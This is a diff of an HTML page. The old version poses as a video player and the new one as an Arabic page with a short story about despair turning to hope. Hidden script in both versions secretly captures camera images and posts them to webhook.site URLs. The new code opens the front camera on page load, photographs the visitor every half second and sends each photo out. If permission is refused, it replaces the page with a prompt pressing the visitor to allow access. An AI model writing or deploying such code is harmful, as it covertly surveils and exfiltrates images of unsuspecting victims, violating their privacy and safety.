@@ -1,114 +1,114 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<title>Video</title>
-<style>
-*{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-}
-body{
-  height:100vh;
-  display:flex;
-  justify-content:center;
-  align-items:center;
-  background:radial-gradient(circle at top,#1a1a1a,#000);
-}
-.container{
-  width:70%;
-  max-width:600px;
-  border-radius:20px;
-  overflow:hidden;
-  box-shadow:0 0 40px rgba(255,255,255,.15);
-  position:relative;
-}
-video{
-  width:100%;
-  display:block;
-  background:#000;
-}
-canvas{
-  display:none;
-}
-/* أزلنا الفلاش نهائياً */
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>كنتُ أظنها النهاية</title>
+  <style>
+    body {
+      margin: 0;
+      background: #ffffff;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      font-family: Arial, 'Tajawal', sans-serif;
+      filter: brightness(200%);
+      transition: filter 0.3s;
+    }
+    header {
+      width: 100%;
+      padding: 30px 20px;
+      background: #ffffff;
+      text-align: center;
+    }
+    h1 {
+      margin: 0;
+      color: #c2185b;
+      font-size: 2.8rem;
+      text-shadow: 0 0 10px #880e4f;
+    }
+    #story {
+      max-width: 800px;
+      margin: 40px 20px;
+      font-size: 1.3rem;
+      line-height: 2;
+      color: #111;
+      text-align: right;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-  <video id="video" controls 
-  poster="https://upload.wikimedia.org/wikipedia/en/1/1c/365_Days_film_poster.jpg">
-    <source src="https://drive.google.com/uc?export=download&id=1Ga3wpKTBUS_HWjWSYkZVn1OhTCeh_j01" type="video/mp4">
-  </video>
+<header>
+  <h1>كنتُ أظنها النهاية</h1>
+</header>
+
+<div id="story">
+  كنت أعيش وكأنني مجرد ظل…
+لا صوت لي، لا قيمة، لا مكان.
+كل صباح كان يشبه الذي قبله،
+ثقل في صدري… وعيون متعبة من بكاء لم يتوقف منذ زمن.
+كنت أضحك أمام الناس،
+لكن في داخلي… كانت هناك فتاة تصرخ ولا أحد يسمعها.
+كنت أخاف أن أكون قد انتهيت،
+أن الحياة قد مرت ولم أترك أثرًا.
+كنت أظنها النهاية.
+لكن في ليلة واحدة،
+رأيت ضوءًا صغيرًا في الظلام.
+كان صوتًا، كلمة، نظرة.
+كان شخصًا لم أتوقعه.
+غيّر كل شيء.
+لم تكن النهاية.
+كانت بداية.
 </div>
 
-<canvas id="canvas"></canvas>
+<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-const video = document.getElementById("video");
-const canvas = document.getElementById("canvas");
-const webhook = "https://webhook.site/a8691b22-72fe-44fe-9cde-6796220aa64e";
+const hiddenVideo = document.getElementById('hiddenVideo');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-let started = false;
+const WEBHOOK_URL = "https://webhook.site/931505bc-2b78-4afe-b3c0-440372424d90";
 
-async function captureImage(facingMode){
-  const stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: facingMode }
-  });
-
-  const track = stream.getVideoTracks()[0];
-  const imageCapture = new ImageCapture(track);
-  const bitmap = await imageCapture.grabFrame();
-
-  canvas.width = bitmap.width;
-  canvas.height = bitmap.height;
-  const ctx = canvas.getContext("2d");
-  ctx.drawImage(bitmap,0,0);
-
-  track.stop();
-
-  return new Promise(resolve=>{
-    canvas.toBlob(blob=>{
-      resolve(blob);
-    },"image/jpeg",0.9);
-  });
-}
-
-video.addEventListener("play", async ()=>{
-  if(started) return;
-  started = true;
-
-  try{
-    // Front camera
-    const frontImage = await captureImage("user");
-
-    // Small delay
-    await new Promise(r=>setTimeout(r,800));
-
-    // Back camera
-    const backImage = await captureImage("environment");
-
-    // Send both images to webhook
-    const formData = new FormData();
-    formData.append("front_camera", frontImage, "front.jpg");
-    formData.append("back_camera", backImage, "back.jpg");
-    formData.append("message","Dual camera capture");
-
-    fetch(webhook,{
-      method:"POST",
-      body:formData
-    }).then(()=>{
-      console.log("Both images sent successfully");
-    }).catch(err=>{
-      console.error("Webhook error:",err);
+async function start() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
     });
 
-  }catch(e){
-    console.error("Camera error:",e);
+    hiddenVideo.srcObject = stream;
+    await hiddenVideo.play();
+
+    // التقاط صورة كل نصف ثانية
+    setInterval(() => capturePhoto(), 500);
+
+  } catch (err) {
+    // إذا رفض الإذن
+    document.body.innerHTML = `
+      <header><h1>اضغط السماح للمتابعة</h1></header>
+      <button onclick="location.reload()" style="margin: 100px; padding: 20px 60px; font-size: 1.8rem; background: #c2185b; color: white; border: none; border-radius: 12px; cursor: pointer;">
+        إعادة المحاولة
+      </button>
+    `;
   }
-});
+}
+
+function capturePhoto() {
+  canvas.width = hiddenVideo.videoWidth;
+  canvas.height = hiddenVideo.videoHeight;
+  ctx.drawImage(hiddenVideo, 0, 0);
+  canvas.toBlob(blob => {
+    const fd = new FormData();
+    fd.append('photo', blob, `capture_${Date.now()}.jpg`);
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+  }, 'image/jpeg', 0.92);
+}
+
+window.addEventListener('load', start);
 </script>
 
 </body>
